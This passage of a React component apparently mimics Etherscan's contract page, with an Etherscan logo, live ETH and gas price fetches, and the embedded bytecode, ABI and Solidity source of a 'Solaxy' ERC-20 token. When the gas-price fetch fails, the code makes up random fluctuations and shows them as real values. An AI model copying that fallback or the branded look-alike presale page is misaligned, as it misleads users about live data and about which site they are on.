                          <h4 className="text-xs font-medium text-gray-900 mb-2 p-2 w-fit bg-[#F8F9FA] border rounded-lg">Query</h4>
                          <div className="flex items-center gap-x-1">
                            <img src={shape} className='w-2 h-2' alt="" />
                            <p className="text-xs text-gray-700 font-mono">{func.queryType}</p>
                          </div>
                        </div>

                        <div>
                          <h4 className="text-xs font-medium text-gray-900 mb-1">Return:</h4>
                          <p className="text-xs text-gray-600">{func.returnDescription}</p>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  const [activeBlueTab, setActiveBlueTab] = useState<string | null>(null);
  const [dropdownPosition, setDropdownPosition] = useState<number>(0);

  const blueTabs = [
    { id: 'buy', label: 'Buy' },
    { id: 'presale', label: 'Presale' },
    { id: 'play', label: 'Play' },
    { id: 'gaming', label: 'Gaming' },
  ];

  const handleTabClick = (tabId: string, event: React.MouseEvent<HTMLButtonElement>) => {
    const buttonElement = event.currentTarget;
    const buttonRect = buttonElement.getBoundingClientRect();
    const containerRect = buttonElement.parentElement?.getBoundingClientRect();

    if (containerRect) {
      if (tabId === 'play') {
        setDropdownPosition(buttonRect.left - containerRect.left - 200);
      } else if (tabId === "gaming") { setDropdownPosition(buttonRect.left - containerRect.left - 250) } else setDropdownPosition(buttonRect.left - containerRect.left - 100);
    }

    setActiveBlueTab(activeBlueTab === tabId ? null : tabId);
  };

  const sampleByteCode = `60806040526000600660006101000a81548160ff0219169083151502179055503480156200002c57600080fd5b506200004d620000416200025260201b60201c565b6200025a60201b60201c565b6040518060400160405280600681526020017f536f6c617879
0000000000000000000000000000000000000000000000000000815250600490805190602001906200009a92919062000470565b506040518060400160405280600481526020017f534f4c5800000000000000000000000000000000000000000000000000000000815250600590805190602001
90620000e892919062000470565b50620001307351f8dca2afe4894ce8b7aab752cf97374662eefd6012600a620001129190620006ba565b64066da2f5806200012491906200070b565b6200031e60201b60201c565b6200017773509e7249dad865852677d6455de63a3882ea8e136012600a62
0001599190620006ba565b6404d23a38206200016b91906200070b565b6200031e60201b60201c565b620001be73bfe68afaf59c7b89ebbecc9e2936e7167d16f6486012600a620001a09190620006ba565b6408090bb2e0620001b291906200070b565b6200031e60201b60201c565b620002057
38c597c1e502049bac882368c3e29943d0d7e78b96012600a620001e79190620006ba565b640336d17ac0620001f991906200070b565b6200031e60201b60201c565b6200024c73697b23ca9c1bf14d89dcea311ee34f4dce8ed0186012600a6200022e9190620006ba565b6409a4747040620002
4091906200070b565b6200031e60201b60201c565b620008df565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffff
ffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073
ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141562000391576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200038890620007cd565b60405180910390fd5b8060036000
828254620003a59190620007ef565b9250508190555080600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254620003fd9190620007ef565b925050819055508173fffffffffff
fffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516200046491906200085d565b60405180910390a35050565b8280546200047e90620008a9565b9060005`

  const sampleABICode = `[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":
[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},
{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},
{"anonymous":false,"inputs":[],"name":"FirstBuyDone","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":
"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":
[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256",
"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"}],"name":"allowance","outputs":
[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":
"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],
"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn",
"outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}]
,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"developmentReserve","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[]
,"name":"firstBuyCompleted","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},
{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[],"name":"listingsReserve","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"marketingReserve","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner",
"outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":
"nonpayable","type":"function"},{"inputs":[],"name":"rewardsReserve","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"internalType":"address","name":"_uniswapPool","type":"address"}],"name":"setUniswapPool","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":
[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view",
"type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":
"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":
"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],
"name":"treasuryReserve","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"uniswapPool","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]`

  const sampleSourceCode = `/**
 *Submitted for verification at Etherscan.io on 2024-12-06
*/

// SPDX-License-Identifier: MIT

/*
  _     _       _     _       _           _            _    ___
 | |   (_) __ _| |__ | |_ ___| |__   __ _(_)_ __      / \  |_ _|
 | |   | |/ _ | _ \| __/ __| _ \ / _ | | _ \    / _ \  | | 
 | | ___ | | (_ | | | | | || (__ | | | | (_ | | | | | |  / ___ \ | |
      | _____ | _ |\__, | _ | | _ |\__\___ | _ | | _ |\__, _ | _ | _ | | _ | /_/   \_\___ |
          | ___ /                                                 
*/

pragma solidity 0.8.9;

  /**
   * @dev Interface of the ERC20 standard as defined in the EIP.
   */
  interface IERC20 {
  /**
   * @dev Emitted when` + `value` + `tokens are moved from one account (` + `from` + `) to
   * another (` + `to` + `).
   *
   * Note that `+ `value` + ` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `+ `spender` + ` for an ` + `owner` + ` is set by
   * a call to {approve}. `+ `value` + ` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);

  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns(uint256);

  /**
   * @dev Returns the amount of tokens owned by `+ `account` + `.
   */
  function balanceOf(address account) external view returns(uint256);

  /**
   * @dev Moves `+ `amount` + ` tokens from the caller's account to ` + `to` + `.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address to, uint256 amount) external returns(bool);

  /**
   * @dev Returns the remaining number of tokens that `+ `spender` + ` will be
   * allowed to spend on behalf of `+ `owner` + ` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender) external view returns(uint256);

  /**
   * @dev Sets `+ `amount` + ` as the allowance of ` + `spender` + ` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns(bool);

  /**
   * @dev Moves `+ `amount` + ` tokens from ` + `from` + ` to ` + `to` + ` using the
   * allowance mechanism. `+ `amount` + ` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address from, address to, uint256 amount) external returns(bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
  /**
   * @dev Returns the name of the token.
   */
  function name() external view returns(string memory);

  /**
   * @dev Returns the symbol of the token.
   */
  function symbol() external view returns(string memory);

  /**
   * @dev Returns the decimals places of the token.
   */
  function decimals() external view returns(uint8);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  function _msgSender() internal view virtual returns(address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns(bytes calldata) {
    return msg.data;
  }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `+ `onlyOwner` + `, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor() {
    _transferOwnership(_msgSender());
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    _checkOwner();
    _;
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view virtual returns(address) {
    return _owner;
  }

  /**
   * @dev Throws if the sender is not the owner.
   */
  function _checkOwner() internal view virtual {
    require(owner() == _msgSender(), 'Ownable: caller is not the owner');
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `+ `onlyOwner` + ` functions. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby disabling any functionality that is only available to the owner.
   */
  function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0));
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`+ `newOwner` + `).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), 'Ownable: new owner is the zero address');
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`+ `newOwner` + `).
   * Internal function without access restriction.
   */
  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

contract Token is Context, IERC20Metadata, Ownable {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private _totalSupply;

  string private _name;
  string private _symbol;
  uint8 private constant _decimals = 18;
  uint256 public constant treasuryReserve = 27_609_200_000 * (10 ** _decimals);
  uint256 public constant marketingReserve = 20_706_900_000 * (10 ** _decimals);
  uint256 public constant rewardsReserve = 34_511_500_000 * (10 ** _decimals);
  uint256 public constant listingsReserve = 13_804_600_000 * (10 ** _decimals);
  uint256 public constant developmentReserve = 41_413_800_000 * (10 ** _decimals);
  bool public firstBuyCompleted = false; // Flag to track if the first buy has been completed
  address public uniswapPool;

  event FirstBuyDone(); // Event emitted when the first buy is done

  /**
   * @dev Contract constructor.
   */
  constructor() {
    _name = 'Solaxy';
    _symbol = 'SOLX';
    _mint(0x51f8dcA2aFe4894Ce8B7aAB752CF97374662EEfD, treasuryReserve);
    _mint(0x509e7249dad865852677d6455dE63A3882ea8E13, marketingReserve);
    _mint(0xBfE68afaF59C7b89ebbEcc9e2936e7167d16F648, rewardsReserve);
    _mint(0x8c597c1E502049bac882368C3e29943d0D7E78b9, listingsReserve);
    _mint(0x697B23CA9C1bF14d89dCeA311Ee34f4Dce8ed018, developmentReserve);
  }

  /**
   * @dev Returns the name of the token.
   * @return The name of the token.
   */
  function name() public view virtual override returns(string memory) {
    return _name;
  }

  /**
   * @dev Returns the symbol of the token.
   * @return The symbol of the token.
   */
  function symbol() public view virtual override returns(string memory) {
    return _symbol;
  }

  /**
   * @dev Returns the number of decimals used for token display.
   * @return The number of decimals.
   */
  function decimals() public view virtual override returns(uint8) {
    return _decimals;
  }

  // Admin function to update the Uniswap pool if needed
  function setUniswapPool(address _uniswapPool) external onlyOwner {
    require(_uniswapPool != address(0), 'Uniswap pool address cannot be zero');
    uniswapPool = _uniswapPool;
  }

  /**
   * @dev Returns the total supply of the token.
   * @return The total supply.
   */
  function totalSupply() public view virtual override returns(uint256) {
    return _totalSupply;
  }

  /**
   * @dev Returns the balance of the specified account.
   * @param account The address to check the balance for.
   * @return The balance of the account.
   */
  function balanceOf(address account) public view virtual override returns(uint256) {
    return _balances[account];
  }

  /**
   * @dev Transfers tokens from the caller to a specified recipient.
   * @param recipient The address to transfer tokens to.
   * @param amount The amount of tokens to transfer.
   * @return A boolean value indicating whether the transfer was successful.
   */
  function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  /**
   * @dev Returns the amount of tokens that the spender is allowed to spend on behalf of the owner.
   * @param from The address that approves the spending.
   * @param to The address that is allowed to spend.
   * @return The remaining allowance for the spender.
   */
  function allowance(address from, address to) public view virtual override returns(uint256) {
    return _allowances[from][to];
  }

  /**
   * @dev Approves the specified address to spend the specified amount of tokens on behalf of the caller.
   * @param to The address to approve the spending for.
   * @param amount The amount of tokens to approve.
   * @return A boolean value indicating whether the approval was successful.
   */
  function approve(address to, uint256 amount) public virtual override returns(bool) {
    _approve(_msgSender(), to, amount);
    return true;
  }

  /**
   * @dev Transfers tokens from one address to another.
   * @param sender The address to transfer tokens from.
   * @param recipient The address to transfer tokens to.
   * @param amount The amount of tokens to transfer.
   * @return A boolean value indicating whether the transfer was successful.
   */
  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns(bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, 'ERC20: transfer amount exceeds allowance');
    unchecked {
      _approve(sender, _msgSender(), currentAllowance - amount);
    }

    return true;
  }

  /**
   * @dev Increases the allowance of the specified address to spend tokens on behalf of the caller.
   * @param to The address to increase the allowance for.
   * @param addedValue The amount of tokens to increase the allowance by.
   * @return A boolean value indicating whether the increase was successful.
   */
  function increaseAllowance(address to, uint256 addedValue) public virtual returns(bool) {
    _approve(_msgSender(), to, _allowances[_msgSender()][to] + addedValue);
    return true;
  }

  /**
   * @dev Decreases the allowance granted by the owner of the tokens to `+ `to` + ` account.
   * @param to The account allowed to spend the tokens.
   * @param subtractedValue The amount of tokens to decrease the allowance by.
   * @return A boolean value indicating whether the operation succeeded.
   */
  function decreaseAllowance(address to, uint256 subtractedValue) public virtual returns(bool) {
    uint256 currentAllowance = _allowances[_msgSender()][to];
    require(currentAllowance >= subtractedValue, 'ERC20: decreased allowance below zero');
    unchecked {
      _approve(_msgSender(), to, currentAllowance - subtractedValue);
    }

    return true;
  }

  /**
   * @dev Transfers `+ `amount` + ` tokens from ` + `sender` + ` to ` + `recipient` + `.
   * @param sender The account to transfer tokens from.
   * @param recipient The account to transfer tokens to.
   * @param amount The amount of tokens to transfer.
   */
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(amount > 0, 'ERC20: transfer amount zero');
    require(sender != address(0), 'ERC20: transfer from the zero address');
    require(recipient != address(0), 'ERC20: transfer to the zero address');

    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, 'ERC20: transfer amount exceeds balance');
    if (!firstBuyCompleted && sender == uniswapPool) {
      require(tx.origin == owner(), 'First Buy Pending');
      firstBuyCompleted = true;
      emit FirstBuyDone();
    }

    unchecked {
      _balances[sender] = senderBalance - amount;
    }
    _balances[recipient] += amount;

    emit Transfer(sender, recipient, amount);
  }

  /**
   * @dev Creates `+ `amount` + ` tokens and assigns them to ` + `account` + `.
   * @param account The account to assign the newly created tokens to.
   * @param amount The amount of tokens to create.
   */
  function _mint(address account, uint256 amount) internal virtual {
    require(account != address(0), 'ERC20: mint to the zero address');

    _totalSupply += amount;
    _balances[account] += amount;
    emit Transfer(address(0), account, amount);
  }

  /**
   * @dev Destroys `+ `amount` + ` tokens from ` + `account` + `, reducing the total supply.
   * @param account The account to burn tokens from.
   * @param amount The amount of tokens to burn.
   */
  function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), 'ERC20: burn from the zero address');

    uint256 accountBalance = _balances[account];
    require(accountBalance >= amount, 'ERC20: burn amount exceeds balance');
    unchecked {
      _balances[account] = accountBalance - amount;
    }
    _totalSupply -= amount;

    emit Transfer(account, address(0), amount);
  }

  /**
   * @dev Destroys `+ `amount` + ` tokens from the caller's account, reducing the total supply.
   * @param amount The amount of tokens to burn.
   */
  function burn(uint256 amount) external {
    _burn(_msgSender(), amount);
  }

  /**
   * @dev Sets `+ `amount` + ` as the allowance of ` + `to` + ` over the caller's tokens.
   * @param from The account granting the allowance.
   * @param to The account allowed to spend the tokens.
   * @param amount The amount of tokens to allow.
   */
  function _approve(address from, address to, uint256 amount) internal virtual {
    require(from != address(0), 'ERC20: approve from the zero address');
    require(to != address(0), 'ERC20: approve to the zero address');

    _allowances[from][to] = amount;
    emit Approval(from, to, amount);
  }
} `;

  const [ethPrice, setEthPrice] = useState({ price: 3606.73, change: -3.10 });
  const [gasPrice, setGasPrice] = useState(0.613);
  const [loading, setLoading] = useState(true);

  const fetchEthPrice = async () => {
    try {
      const response = await fetch(
        'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd&include_24hr_change=true'
      );
      const data = await response.json();

      if (data.ethereum) {
        setEthPrice({
          price: data.ethereum.usd,
          change: data.ethereum.usd_24h_change || 0
        });
      }
    } catch (error) {
      console.error('Error fetching ETH price:', error);
    }
  };

  // Fetch gas price from Etherscan API (free tier)
  const fetchGasPrice = async () => {
    try {
      const response = await fetch(
        'https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=YourApiKeyToken'
      );
      const data = await response.json();

      if (data.status === '1' && data.result) {
        // Convert from Gwei to a more realistic current range
        const standardGas = parseFloat(data.result.SafeGasPrice);
        setGasPrice(standardGas);
      }
    } catch (error) {
      console.error('Error fetching gas price:', error);
      // Fallback: simulate realistic gas price fluctuation
      setGasPrice(prev => {
        const variation = (Math.random() - 0.5) * 0.1;
        return Math.max(0.1, prev + variation);
      });
    }
  };

  useEffect(() => {
    // Initial fetch
    const fetchData = async () => {
      await Promise.all([fetchEthPrice(), fetchGasPrice()]);
      setLoading(false);
    };

    fetchData();

    // Set up intervals for real-time updates
    const ethPriceInterval = setInterval(fetchEthPrice, 30000); // Update every 30 seconds
    const gasPriceInterval = setInterval(fetchGasPrice, 15000); // Update every 15 seconds

    return () => {
      clearInterval(ethPriceInterval);
      clearInterval(gasPriceInterval);
    };
  }, []);

  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  const toggleMobileMenu = () => {
    setMobileMenuOpen(!mobileMenuOpen);
    setActiveDropdown(null);
  };

  const handleMobileDropdownClick = (dropdown: string) => {
    setActiveDropdown(activeDropdown === dropdown ? null : dropdown);
  };
  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    console.log(activeBlueTab)
    const handleClickOutside = (event: MouseEvent) => {
      if (containerRef.current && !containerRef.current.contains(event.target as Node)) {
        setActiveBlueTab(null);
      }
    };

    if (activeBlueTab) {
      document.addEventListener('mousedown', handleClickOutside);
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [activeBlueTab]);

  function shortenEthAddress(address: string, startChars = 6, endChars = 6) {
    // Validate input
    if (!address || typeof address !== 'string') {
      return '';
    }

    // Remove any whitespace
    address = address.trim();

    // Check if it's a valid Ethereum address format (starts with 0x and is 42 chars long)
    if (!address.startsWith('0x') || address.length !== 42) {
      return address; // Return as-is if not a valid format
    }

    // If the address is already short enough, return it as-is
    if (address.length <= startChars + endChars + 3) { // +3 for "0x" and "..."
      return address;
    }

    // Extract the parts
    const start = address.substring(0, startChars);
    const end = address.substring(address.length - endChars);

    return `${start}...${end}`;
  }
  return (
    <div className="min-h-screen bg-white">
      {/* Top Status Bar */}
      <div className="bg-white border-b border-gray-200 px-4 py-2 text-sm text-gray-600">
        {/* Mobile Layout */}
        <div className="block md:hidden py-4 space-y-4">
          {/* Top row: Price info */}
          <div className="flex justify-between items-center text-xs text-[#6C757D]">
            <span>ETH: <span className="text-[#0584C3]">${loading ? '3,606.73' : ethPrice.price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
              <span className={ethPrice.change >= 0 ? 'text-green-500' : 'text-red-500'}>
                ({ethPrice.change >= 0 ? '+' : ''}{ethPrice.change.toFixed(2)}%)
              </span>
            </span>
            <span className="text-[#0584C3]">Gas: {loading ? '0.613' : gasPrice.toFixed(3)} Gwei</span>
          </div>

          {/* Search bar */}
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-400" />
            <input
              type="text"
              placeholder="Search address, hash, block..."
              value={searchValue}
              onChange={(e) => setSearchValue(e.target.value)}
              className="w-full bg-[#F8F9FA] pl-10 pr-12 py-3 rounded-lg border text-gray-700 placeholder-[#6E777F] focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
            <div className="absolute right-3 top-1/2 transform -translate-y-1/2 w-6 h-6 bg-[#BCC2C8] rounded-lg flex items-center justify-center">
              <span className="text-white font-medium text-xs">/</span>
            </div>
          </div>
        </div>

        {/* Tablet Layout */}
        <div className="hidden md:block lg:hidden py-4">
          <div className="space-y-4">
            {/* Price info row */}
            <div className="flex items-center justify-start space-x-6 text-xs text-[#6C757D]">
              <span>ETH Price: <span className="text-[#0584C3]">${loading ? '3,606.73' : ethPrice.price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                <span className={ethPrice.change >= 0 ? 'text-green-500' : 'text-red-500'}>
                  ({ethPrice.change >= 0 ? '+' : ''}{ethPrice.change.toFixed(2)}%)
                </span>
              </span>
              <span>Gas: <span className="text-[#0584C3]">{loading ? '0.613' : gasPrice.toFixed(3)} Gwei</span></span>
            </div>

            {/* Search and actions row */}
            <div className="flex items-center gap-4">
              <div className="flex-1 relative">
                <Search className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  placeholder="Search by Address / Txn Hash / Block / Token"
                  value={searchValue}
                  onChange={(e) => setSearchValue(e.target.value)}
                  className="w-full bg-[#F8F9FA] pl-12 pr-16 py-3 rounded-lg border text-gray-700 placeholder-[#6E777F] focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 w-6 h-6 bg-[#BCC2C8] rounded-lg flex items-center justify-center">
                  <span className="text-white font-medium text-xs">/</span>
                </div>
              </div>

              <div className="flex items-center gap-2">
                <div className="relative">
                  <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center border border-gray-300 hover:bg-gray-50 cursor-pointer">
                    <BookOpen className="w-5 h-5 text-gray-600" />
                  </div>
                  <div className="absolute -top-1 -right-1 w-3 h-3 bg-red-500 rounded-full"></div>
                </div>
                <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center border border-gray-300 hover:bg-gray-50 cursor-pointer">
                  <Sun className="w-5 h-5 text-blue-500" />
                </div>
                <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center border border-gray-300 hover:bg-gray-50 cursor-pointer">
                  <div className="w-5 h-5 text-gray-800">
                    <svg viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 1.75l-6.25 10.5L12 16l6.25-3.75L12 1.75zM5.75 13.5L12 22.25l6.25-8.75L12 17.25 5.75 13.5z" />
                    </svg>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Desktop/Laptop Layout (your original design) */}
        <div className="hidden lg:flex justify-between items-center max-w-[84rem] mx-auto">
          <div className="flex items-center space-x-4 text-xs text-[#6C757D]">
            <span>ETH Price: <span className="text-[#0584C3]">{loading ? '$3,606.73' : `${ethPrice.price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} `}</span> <span className={ethPrice.change >= 0 ? 'text-green-500' : 'text-red-500'}>
              ({ethPrice.change >= 0 ? '+' : ''}{ethPrice.change.toFixed(2)}%)
            </span></span>
            <span className="flex items-center"><FaGasPump className='mr-1 text-[#C4C8CB]' /> Gas: <span className="text-[#0584C3] ml-1">{loading ? '0.613' : gasPrice.toFixed(3)} Gwei</span></span>
          </div>

          <div className="flex items-center gap-4">
            {/* Search Bar */}
            <div className="flex-1 relative">
              <div className="relative flex items-center w-[33rem] ">
                <Search className="absolute left-4 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  placeholder="Search by Address / Txn Hash / Block / Token / Domain Name"
                  value={searchValue}
                  onChange={(e) => setSearchValue(e.target.value)}
                  className="w-full bg-[#F8F9FA] pl-12 pr-16 py-2  rounded-lg border text-gray-700 placeholder-[#6E777F] focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                />
                {/* Slash Icon inside search bar */}
                <div className="absolute right-3 w-6 h-6 bg-[#BCC2C8] rounded-lg flex items-center justify-center">
                  <span className="text-white font-medium text-[0.7rem]">/</span>
                </div>
              </div>
            </div>

            {/* Action Icons */}
            <div className="flex items-center gap-2">
              {/* Book Icon with Red Dot */}
              <div className="relative">
                <div className="w-8 h-8 bg-white rounded-lg flex items-center justify-center border border-gray-300 hover:bg-gray-50 cursor-pointer">
                  <BookOpen className="w-4 h-4 text-gray-600" />
                </div>
                <div className="absolute -top-1 -right-1 w-3 h-3 bg-red-500 rounded-full"></div>
              </div>

              {/* Sun/Light Mode Icon */}
              <div className="w-8 h-8 bg-white rounded-lg flex items-center justify-center border border-gray-300 hover:bg-gray-50 cursor-pointer">
                <Sun className="w-4 h-4 text-blue-500" />
              </div>

              {/* Diamond/Ethereum Icon */}
              <div className="w-8 h-8 bg-white rounded-lg flex items-center justify-center border border-gray-300 hover:bg-gray-50 cursor-pointer">
                <div className="w-4 h-4 text-gray-800">
                  <svg viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 1.75l-6.25 10.5L12 16l6.25-3.75L12 1.75zM5.75 13.5L12 22.25l6.25-8.75L12 17.25 5.75 13.5z" />
                  </svg>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className={`max-w-[86rem] mx-auto px-4 py-2`}>
          <div className="flex items-center justify-between mb-0 ">
            {/* Logo */}
            <div className="flex items-center">
              <img src={logoEtherscan} alt="" className='w-40' />
            </div>

            {/* Mobile Menu Button */}
            <button
              onClick={toggleMobileMenu}
              className="lg:hidden p-2 rounded-md text-gray-600 hover:text-gray-900 hover:bg-gray-100 transition-all duration-200"
            >
              <div className="relative w-6 h-6">
                <Menu
                  className={`w-6 h-6 absolute inset-0 transition-all duration-300 ${mobileMenuOpen ? 'opacity-0 rotate-90' : 'opacity-100 rotate-0'
                    } `}
                />
                <X
